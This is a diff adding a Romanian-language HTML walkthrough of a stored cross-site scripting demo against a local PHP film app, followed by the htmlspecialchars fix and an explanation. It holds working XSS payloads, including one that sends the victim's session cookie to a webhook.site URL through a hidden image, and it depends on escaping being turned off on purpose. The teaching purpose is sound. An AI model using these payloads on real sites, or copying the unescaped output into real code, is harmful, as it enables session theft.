@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>XSS Demo Steps</title>
+    <style>
+        body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 2rem; }
+        h1 { color: #f0b429; }
+        h2 { color: #7eb3e0; border-bottom: 1px solid #30363d; padding-bottom: 0.3rem; }
+        .step { background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+                padding: 1rem 1.2rem; margin: 1rem 0; }
+        .step .num { color: #f85149; font-weight: bold; font-size: 1.1rem; }
+        code { background: #1f2937; color: #3fb950; padding: 2px 6px; border-radius: 4px;
+               font-size: 0.95rem; display: inline-block; }
+        pre  { background: #1f2937; color: #3fb950; padding: 1rem; border-radius: 6px;
+               overflow-x: auto; white-space: pre-wrap; }
+        .warn  { color: #f85149; }
+        .ok    { color: #3fb950; }
+        .note  { color: #f0b429; font-size: 0.85rem; }
+        a { color: #7eb3e0; }
+    </style>
+</head>
+<body>
+
+<h1>XSS Demo — Pas cu pas</h1>
+
+<!-- ══════════════════════════════════════════════════════════
+     TEST 1 — Cel mai simplu: alert box
+     ══════════════════════════════════════════════════════════ -->
+<h2>Test 1 — Alert box (confirmare că XSS merge)</h2>
+
+<div class="step">
+    <p><span class="num">1.</span> Loghează-te la <a href="http://localhost/HTPY/login.php" target="_blank">http://localhost/HTPY/login.php</a></p>
+</div>
+
+<div class="step">
+    <p><span class="num">2.</span> Mergi la <a href="http://localhost/HTPY/profile.php" target="_blank">profile.php</a> → secțiunea <b>Add a Film</b></p>
+</div>
+
+<div class="step">
+    <p><span class="num">3.</span> În câmpul <b>Title</b> scrie exact:</p>
+    <pre>&lt;script&gt;alert('XSS works!')&lt;/script&gt;</pre>
+    <p>Year: orice (ex. 2020), apoi click <b>Add Film</b></p>
+</div>
+
+<div class="step">
+    <p><span class="num">4.</span> Pagina se reîncarcă. Ar trebui să apară un <b>popup alert</b> cu textul <code>XSS works!</code></p>
+    <p class="ok">✔ Dacă apare popup-ul → XSS funcționează</p>
+    <p class="warn">✘ Dacă NU apare → verifică că în profile.php liniile cu htmlspecialchars sunt comentate</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════
+     TEST 2 — Furt cookie de sesiune
+     ══════════════════════════════════════════════════════════ -->
+<h2>Test 2 — Citire cookie de sesiune (simulare furt)</h2>
+
+<div class="step">
+    <p><span class="num">1.</span> Adaugă un film cu titlul:</p>
+    <pre>&lt;script&gt;alert('Cookie: ' + document.cookie)&lt;/script&gt;</pre>
+    <p>Reload pagina → popup-ul afișează cookie-ul <code>PHPSESSID=...</code></p>
+    <p class="note">Acesta este ID-ul sesiunii tale. Dacă un atacator îl obține, poate impersona contul tău.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════
+     TEST 3 — Redirect pe altă pagină
+     ══════════════════════════════════════════════════════════ -->
+<h2>Test 3 — Redirect forțat</h2>
+
+<div class="step">
+    <p><span class="num">1.</span> Adaugă un film cu titlul:</p>
+    <pre>&lt;script&gt;document.location='https://google.com'&lt;/script&gt;</pre>
+    <p>Reload pagina → ești redirecționat automat la Google.</p>
+    <p class="note">Într-un atac real, redirectul ar fi către o pagină de phishing care arată identic cu site-ul tău, cerând din nou parola.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════
+     TEST 4 — Imagine invizibilă (exfiltrare date)
+     ══════════════════════════════════════════════════════════ -->
+<h2>Test 4 — Exfiltrare date printr-o imagine invizibilă</h2>
+
+<div class="step">
+    <p><span class="num">1.</span> Adaugă un film cu titlul:</p>
+    <pre>&lt;img src="x" onerror="this.src='https://webhook.site/YOUR_ID?c='+document.cookie" style="display:none"&gt;</pre>
+    <p>Înlocuiește <code>YOUR_ID</code> cu un ID de la <a href="https://webhook.site" target="_blank">https://webhook.site</a> (serviciu gratuit care captează request-uri)</p>
+    <p class="note">Când victima vizitează profilul, cookie-ul ei e trimis automat la webhook.site fără niciun popup vizibil.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════
+     CUM PATCH-UIEȘTI
+     ══════════════════════════════════════════════════════════ -->
+<h2>Cum remediezi (patch)</h2>
+
+<div class="step">
+    <p>Deschide <code>profile.php</code> la secțiunea tabelului de filme.</p>
+    <p>Comentează liniile <span class="warn">VULNERABLE</span>:</p>
+    <pre>// &lt;td&gt;&lt;?= $f['title'] ?&gt;&lt;/td&gt;</pre>
+    <p>Decomentează liniile <span class="ok">SECURE</span>:</p>
+    <pre>&lt;td&gt;&lt;?= htmlspecialchars($f['title']) ?&gt;&lt;/td&gt;</pre>
+    <p>Copiază în XAMPP:</p>
+    <pre>Copy-Item -Recurse -Force "C:\Users\Tutu\IdeaProjects\HTPY" "C:\xampp\htdocs\HTPY"</pre>
+    <p class="ok">✔ Acum &lt;script&gt; devine &amp;lt;script&amp;gt; — afișat ca text, nu executat.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════
+     DE CE FUNCȚIONEAZĂ
+     ══════════════════════════════════════════════════════════ -->
+<h2>De ce funcționează</h2>
+
+<div class="step">
+    <p><b>Fără protecție:</b> titlul e inserat direct în HTML:</p>
+    <pre>&lt;td&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/td&gt;</pre>
+    <p>Browser-ul vede un tag <code>&lt;script&gt;</code> valid și îl execută.</p>
+    <br>
+    <p><b>Cu htmlspecialchars:</b> caracterele speciale sunt convertite:</p>
+    <pre>&lt;td&gt;&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;&lt;/td&gt;</pre>
+    <p>Browser-ul afișează textul literal <code>&lt;script&gt;...</code> — nu execută nimic.</p>
+</div>
+
+</body>
+</html>
